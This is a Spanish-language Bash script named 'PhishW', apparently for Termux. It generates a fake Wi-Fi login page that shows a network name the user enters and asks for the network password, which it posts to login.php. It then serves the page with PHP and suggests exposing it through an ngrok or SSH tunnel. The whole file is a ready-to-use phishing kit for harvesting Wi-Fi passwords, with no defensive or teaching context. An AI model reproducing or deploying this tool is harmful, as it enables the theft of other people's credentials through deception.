#! /bin/bash

clear
setterm -foreground green
figlet PhishW
echo ""
echo -n "[+]Introduce el nombre de la red wifi >> "
read a
echo "
<!DOCTYPE html>
<html lang='es'>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <meta http-equiv='X-UA-Compatible' content='ie=edge'>
  <title>Chat entreunosyceros</title>
  <link rel='stylesheet' href='style.css'>
  <link rel='icon' type='image/x-icon' href='favicon.ico'>
  <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css'/>
</head>
<body>
  <div class='wrapper'>
    <section class='form signup'>
      <header><FONT COLOR='gray'>$a</FONT><img src='D.png' width='43px' height='35px'></header>
      <form action='login.php'  method='POST'>
        <div class='field input'>
          <label>Contraseña</label>
          <input type='password' name="Clave" placeholder='introducir contraseña' required>
          <i class='fas fa-eye'></i>
        </div>
        <div class='SubmitBtn'>
          <center><input class='submitBtn' type='submit'  value='Conectar'></center>
        </div>
      </form>
      <div class='link'>Avanzado <a href='login.php'</a></div>
    </section>
  </div>

  <script src='pass-show-hide.js'></script>
</body>
</html>
" > index.html
sleep 1
echo -n "[+]Escribe un puerto ej[4444] >> "
read b
sleep 1
echo ""
while :
do
#MENU
#ESCOJER MENU
echo "-----------------------------"
echo "| [1]. Montar servidor php  |"
echo "| [2]. Salir                |"
echo -n "OPCION >> "
read opcion
case $opcion in
1)
#! /bin/bash
cd /data/data/com.termux/files/home/PhishW
setterm -foreground cyan
echo ""
echo "localhost:$b abierto "
echo "Haga un tunel con ngrok o ssh"
echo ""
php -S 0.0.0.0:$b
#
;;
2)
#! /bin/bash
setterm -foreground cyan
echo "Bye"
exit
#
;;
esac 
done 
#
